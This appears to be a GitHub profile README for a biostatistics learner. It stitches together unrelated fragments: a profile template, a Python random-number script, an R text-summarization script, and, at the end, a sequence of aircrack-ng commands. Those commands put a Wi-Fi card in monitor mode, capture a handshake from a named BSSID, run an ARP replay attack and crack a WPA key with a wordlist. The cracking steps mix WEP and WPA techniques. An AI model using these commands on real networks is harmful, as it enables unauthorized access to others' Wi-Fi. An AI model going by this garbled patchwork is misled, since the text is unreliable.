- 👋 Hi, I’m @Emmanuelmwasaru
- 👀 I’m interested in Biostatistics 
- 🌱 I’m currently learning Biostatistics 
- 💞️ I’m looking to collaborate on data science 
- 📫 How to reach me on Facebook @Emmanuel Mwasaru 
- 😄 Pronouns: He
- ⚡ Fun fact: Coolkid

<!
Emmanuelmwasaru/Emmanuelmwasaru is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
npm install
import random

def generate_random_numbers(count, start, end):
    random_numbers = []
    for _ in range(count):
        random_numbers.append(random.randint(start, end))
    return random_numbers

if __name__ == "__main__":
    count = 100  # Number of random numbers to generate
    start_range = 1  # Start of the range
    end_range = 1000  # End of the range

    random_numbers = generate_random_numbers(count, start_range, end_range)
    print("Generated Random Numbers:", random_numbers)
# Install necessary packages
install.packages("tm")
install.packages("textstem")

# Load libraries
library(tm)
library(textstem)

# Sample text
text <- "This is a sample text. It is used for demonstrating text summarization in R. This text contains multiple sentences. Text summarization is a process of creating a short and concise version of a longer document."

# Create a Corpus
docs <- Corpus(VectorSource(text))

# Preprocessing
docs <- tm_map(docs, content_transformer(tolower))
docs <- tm_map(docs, removePunctuation)
docs <- tm_map(docs, removeNumbers)
docs <- tm_map(docs, removeWords, stopwords("english"))
docs <- tm_map(docs, stripWhitespace)
docs <- tm_map(docs, lemmatize_strings)

# Convert to a Document-Term Matrix
dtm <- DocumentTermMatrix(docs)

# Calculate term frequency
term_freq <- colSums(as.matrix(dtm))
term_freq <- sort(term_freq, decreasing = TRUE)

# Display the most frequent terms
term_freq

# Summarization (basic approach by taking top n sentences)
n <- 2
sentences <- unlist(strsplit(text, "(?<=[.!?])\\s+", perl = TRUE))
scores <- sapply(sentences, function(sentence) sum(term_freq[unlist(strsplit(sentence, " "))]))
top_sentences <- sentences[order(scores, decreasing = TRUE)][1:n]

# Concatenate the summary sentences
summary <- paste(top_sentences, collapse = " ")
summary
$ sudo apt install build-essential autoconf automake libtool pkg-config libnl-3-dev libnl-genl-3-dev libssl-dev ethtool shtool rfkill zlib1g-dev libpcap-dev libsqlite3-dev libpcre3-dev libhwloc-dev libcmocka-dev hostapd wpasupplicant tcpdump screen iw usbutils
$ git clone https://github.com/aircrack-ng/aircrack-ng
$ cd aircrack-ng
# kill all interfering processes prior to using the aircrack-ng
airmon-ng check kill

# put your network device into monitor mode
airmon-ng start wlan0

# listen for all nearby beacon frames to get target BSSID and channel
airodump-ng mon0

# start listening for the handshake on a new console session
airodump-ng -c 10 --bssid 08:00:BF:E6:31:2E -w output-file mon0

# start the ARP request replay attack
aireplay-ng --arpreplay -b 08:00:BF:E6:31:2E -h 00:0F:35:51:AC:22 mon0

# run aircrack-ng to obtain the WPA key
aircrack-ng -a2 -b 08:00:BF:E6:31:2E -w wordlist.txt output*.cap
